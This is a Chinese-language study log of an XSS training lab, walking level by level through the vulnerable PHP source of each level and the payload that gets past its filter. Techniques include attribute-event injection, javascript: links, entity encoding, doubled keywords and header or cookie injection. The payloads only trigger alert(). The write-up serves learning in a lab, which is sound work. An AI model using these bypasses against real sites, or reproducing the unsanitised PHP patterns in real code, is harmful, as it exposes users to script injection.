# xss lab学习记录

### 第一关

在url中的name后面随便输入，输入的内容会在页面回显。

<h2 align="center">欢迎用户test</h2>

显示内容是在html标签之间，采用标签注入

name=<script>alert(1)</script>

出现弹窗

完成的不错！

查看后台源码可知为GET型，只通过$_GET[“name”]，获取name的值，并没有过滤直接echo输出

```
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```

点击确定以后就进入了第二关

### 第二关

在搜索框中随便输入，输入的内容还是会回显在页面上

查看源代码

<h2 align="center">没有找到和2相关的结果.</h2>

输入第一关的

<script>alert(1)</script>

<h2 align="center">没有找到和&lt;script&gt;alert(1)&lt;/script&gt;相关的结果.</h2>

但是这个地方不行

继续看

<input type="submit" name="submit" value="搜索">

在表单中的value属性内，要先闭合input标签，然后再注入代码

"><script>alert(1)</script>

还有另一种方法

闭合value属性，在input标签内加入事件属性

" onclick="alert(11)

onclick 事件会在元素被点击时发生。

看看源代码

echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>

里面有一个函数.htmlspecialchars($str).

htmlspecialchars()函数特殊字符转换为HTML实体，即：“ < ”，“ > ”，“ ” ”字符均会被过滤

- & （和号）成为 &
- " （双引号）成为 "
- ' （单引号）成为 '
- < （小于）成为 <
- \> （大于）成为 >

<input type=submit name=submit value="搜索"/>

 但在input标签中，value未存在过滤措施，所以嘛这里才可以进行xss攻击

### 第三关

<script>alert(1)</script>

没有找到和<script>alert(1)</script>相关的结果.

回显的位置是有过滤的

"><script>alert(1)</script>

没有找到和"><script>alert(1)</script>相关的结果.

这次input标签也有过滤了

<input type="submit" name="submit" value="搜索">

查看源码发现还是这一句，就可以用第二关的另一种方法

' onclick='alert(1)

然后就可以了

果然input标签是有过滤的

<input name=keyword  value='".htmlspecialchars($str)."'>	

而且value的值是被单引号所包裹的

这也怪不得用双引号一直不行了

### 第四关

源代码里面还是有

<input type="submit" name="submit" value="搜索">

' onclick='alert(1)

这个已经不行了

但是根据上一题的经验这里可能是被双引号所包裹的

" onclick="alert(1)

哈哈居然真的是

源代码是

```
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
```

这里把标签的符号过滤了，就只能采用闭合的方式

<input name=keyword  value="'.$str3.'">

这里同时用单引号和双引号包裹

加单引号以后还是被双引号包裹当成一个字符串传进去的

### 第五关

<script>alert(1)</script>

不行

" onclick="alert(1)

也不行

' onclick='alert(1)

都不行

直接看源码吧

```
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
```

这直接把<script替换成了<scr_ipt，而且把所有的on替换了，所有的事件属性都是带有on的，所以就只能换成其他标签构造语句

源代码是<input name=keyword  value="'.$str3.'">

还是要先闭合双引号

这里就用到了

javascript伪协议

"><a href="javascript:alert(1)"

payload的长度：31变成了一个链接打开就过关了

看了源码感觉大小写绕过也是可以的啊

str_replace是大小写敏感的str_ireplace()对大小写不敏感

"><sCriPt>alert(1)</sCrIpt>

$str = strtolower($_GET["keyword"]);

突然发现前面还有一个函数strtolower，这个函数可以把所有大写字母转化为小写，所以大小写绕不过

### 第六关

直接看源代码吧

```
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
```

伪协议就都用不了了

但是可以发现这里可以用大小写绕过

"><sCriPt>alert(1)</sCrIpt>

### 第七关

```
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
```


直接看源代码啊

这里大小写是绕不过的

这里是将字符串替换为空的，可以双写绕过

"  oonnclick="alert(1)"

### 第八关

```
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```

<input name=keyword  value="'.htmlspecialchars($str).'">

这一关直接把双引号给搞没了，而且大小写都会被过滤

这里可以采用html实体编码

HTML对符号很敏感，比如空格，“<”,“>”等，于是这些符号需要用一些编码代替，这些编码就是HTML实体编码。

javascript:alert(1)

编码以后

```
java&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)
```

然后点链接就可以了

### 第九关

```
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```

这个过滤是和上一关一样的，但是后面加了新的限制条件

```php
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
//这段的作用是检查关键字段的值，如果在传入字段经过过滤以后进行判断，如果不包含http://，则返回false，这里不能返回false，所以传入内容里面应该包含关键字http://。
```

strpos() 函数查找字符串在另一字符串中第一次出现的位置。

注释：strpos() 函数对大小写敏感。

返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。

类似的有

- [stripos()](https://www.w3school.com.cn/php/func_string_stripos.asp) - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）
- [strripos()](https://www.w3school.com.cn/php/func_string_strripos.asp) - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）
- [strrpos()](https://www.w3school.com.cn/php/func_string_strrpos.asp) - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）

```
java&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert('http://')
```

### 第十关

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];//感觉有点被糊弄了str完全没有什么用
$str11 = $_GET["t_sort"];//str11突然出现可能是从那两个hidden里面冒出来的
$str22=str_replace(">","",$str11);//这里过滤也是str11，看来str11确实很重要
$str33=str_replace("<","",$str22);//这里再次过滤str11石锤了
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".
//这个地方虽然是输出str1，但是用了.htmlspecialchars过滤，这个地方确实没有办法利用
'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
//这个地方里面有三个隐藏值，也不知道是哪个就得一个一个试，但是看源码很显然是t_sort毕竟传了str33
?>
<center><img src=level10.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
```

因为这里有过滤<>所以感觉用事件绕过会更方便一些

onmouseover 事件属性

当鼠标指针移动到图像上时执行一段 JavaScript：

```
例如
<img onmouseover="bigImg(this)" src="smiley.gif" alt="Smiley">
```

注释：onmouseover  属性不适用以下元素：<base>、<bdo>、<br>、<head>、<html>、<iframe>、<meta>、<param>、<script>、<style> 或 <title>。

accesskey 属性

带有指定快捷键的超链接：

```
例如
<a href="http://www.w3school.com.cn/html/" accesskey="h">HTML</a><br />
<a href="http://www.w3school.com.cn/css/" accesskey="c">CSS</a>
```

注释：以下元素支持 accesskey 属性：<a>, <area>, <button>, <input>, <label>, <legend> 以及 <textarea>。

<input name="t_sort"  value="'.$str33.'" type="hidden">

input是隐藏的要想办法让它传进去

emm直接在url上传应该可以吧

&t_sort=123456" onclick="alert(1)

emmm这样还不可以,还得构造一个文本框

&t_sort=123456" onclick="alert(1)" type="text

type="text"为构造一个文本框，用来触发onclick事件

&t_sort=123456" onmouseover="alert(1)" type="text

这个将鼠标移到文本框上就可以触发了

### 第十一关

<input name="t_ref" value="http://e431d9b5-6a95-4fc7-a162-e2c024ee49e7.node3.buuoj.cn/level10.php?t_sort=123456%22%20onmouseover=%22alert(1)%22%20type=%22text" type="hidden">

这个地方感觉是可以用事件注入的

奇怪感觉这个url有点眼熟

这是上一题的内容啊

抓包

抓到Referer: http://c9fe2020-de9b-468d-8502-b9f3745b6fb2.node3.buuoj.cn/level11.php?keyword=good%2520job!

headers里面

<input name="t_ref"  value="http://c9fe2020-de9b-468d-8502-b9f3745b6fb2.node3.buuoj.cn/level11.php?keyword=good%2520job!" type="hidden">

refere的位置进行注入试试

<input name="t_ref"  value="123456" onclick="alert(1)" type="text" type="hidden">

123456" onclick="alert(1)" type="text

```php
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

$_SERVER   https://blog.csdn.net/moliyiran/article/details/79806108

$_SERVER['HTTP_REFERER'] #链接到当前页面的前一页面的 URL 地址。就可以用referer注入

看完代码感觉t_sort的位置也是可以传参的

&t_sort=123" onclick="alert(1)" type="text

传值以后显示<input name="t_sort"  value="123&quot; onclick=&quot;alert(1)&quot; type=&quot;text" type="hidden">

```php
&quot;这在HTML中是个转义字符
```

&t_sort=123&quot" onclick=&quot"alert(1)&quot" type=&quot"text

<input name="t_sort"  value="123" type="hidden">

加&quot以后就直接闭合了

然后发现

htmlspecialchars()函数特殊字符转换为HTML实体

双引号都不行

```

    & （和号）成为 &
    " （双引号）成为 "
    ' （单引号）成为 '
    < （小于）成为 <
    > （大于）成为 >

提示：如需把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode() 函数。
```

### 第十二关

页面源代码里面有

<input name="t_ua" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" type="hidden">

感觉是和十一题差不多的

抓包找到

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0)

123456" onclick="alert(1)" type="text

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

$_SERVER['HTTP_USER_AGENT'] #当前请求的 User_Agent: 头部的内容。

### 第十三关

```
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_cook"  value="" type="hidden">
```

直觉是t_cook然后是cookie注入,抓包cookie后面call me maybe?看来确实是了

改cookie就行

user=123456" onclick="alert(1)" type="text

```php
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

### 第十四关

```python
<iframe name="leftframe" marginwidth="10" marginheight="10" src="http://www.exifviewer.org/" scrolling="no" width="80%" height="80%" frameborder="no"></iframe>
```

看大佬说本关因iframe调用的文件地址失效，无法进行测试。要考的应该是通过修改iframe调用的文件来实现xss注入

### 第十五关

f12找到提示

<span class="ng-include:"></span>

这地方一看就是可以传值的

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>
```

ng-include属性：

定义和用法

 **ng-include** 指令用于包含外部的 HTML 文件。

 包含的内容将作为指定元素的子节点。

 `ng-include` 属性的值可以是一个表达式，返回一个文件名。

 默认情况下，包含的文件需要包含在同一个域名下。

1.ng-include,如果单纯指定地址，必须要加引号
2.ng-include,加载外部html，script标签中的内容不执行，不能加载，如果需要控制器处理需要在主页中注册
3.ng-include,加载外部html中含有style标签样式可以识别
4.ng-inclue,记载外部html中的link标签可以加载

https://blog.csdn.net/u011127019/article/details/53666528/

根据查到的资料再看源码

<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"></script>

调用的js文件中有地址被墙了，需要修改js源文件路径

在网站中的多个页面上运行相同的 JavaScript，就应该创建外部 JavaScript 文件，而不是重复编写相同的脚本。把脚本文件以 .js 扩展名进行保存，然后在 <script> 标签中使用 src 属性引用它。

**注意：**外部脚本文件不能包含 <script> 标签。

**注意：**正确地引用您写入脚本的外部脚本文件。

onerror 事件会在文档或图像加载过程中发生错误时被触发。

如果装载图像时发生了错误，则显示一个对话框：

<img src="image.gif" onerror="alert('图片不能被加载。')">

在15页面里面是没有注入点，但是在别的页面里面有

```
src='level8.php?keyword=java&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)'
```

```
src='level1.php?name=<img src=1 onerror=alert(123)>'
```

### 第十六关

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);//大小写绕不过
$str2=str_replace("script","&nbsp;",$str);//script没了
$str3=str_replace(" ","&nbsp;",$str2);//空格没了
$str4=str_replace("/","&nbsp;",$str3);//斜杠没了
$str5=str_replace("	","&nbsp;",$str4);//空格又没了
echo "<center>".$str5."</center>";
?>
```

在html代码中每输入一个转义字符&nbsp就表示一个空格，输入十个&nbsp，页面中就显示10个空格位置。

而在html代码中输入空格，不管输入多少个空格，最终在页面中显示的空格位置只有一个。

用url编码绕过

```
<img%0Asrc=1%0Aonerror=alert("xss");>
```

### 第十七关

```python
<embed src="xsf01.swf?a=b" heigth="100%" width="100%">src="xsf01.swf?a=b"
```

```
"<embed src=xsf01.swf?" " width=100% heigth=100%>"
```

本身就是闭合的，所以不需要构造闭合，所以可以绕过htmlspecialchars该函数，因此，我们输入的才会被当成独立事件属性，不然就需要去构造闭合，而对于htmlspecialchars来说，双引号是特殊处理的，不能用来闭合

```
arg01=a&arg02=b onmouseover=javascript:alert(1)
```

火狐不支持swf换一个浏览器就可以成功弹出了

源码里还是有过滤的

```python
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
```



### 第十八关

感觉上是和上一题一样的

```python
<embed src="xsf02.swf?a=b" heigth="100%" width="100%">
```

arg01=a&arg02=b onmouseover=javascript:alert(1)

源码

```python
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
```

不能说有点像简直就是一模一样

### 第十九关

直接看十九题的源码

```php
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>'; 
```

这一次就闭合不了了

可以用flash注入但是我现在还没有学会诶



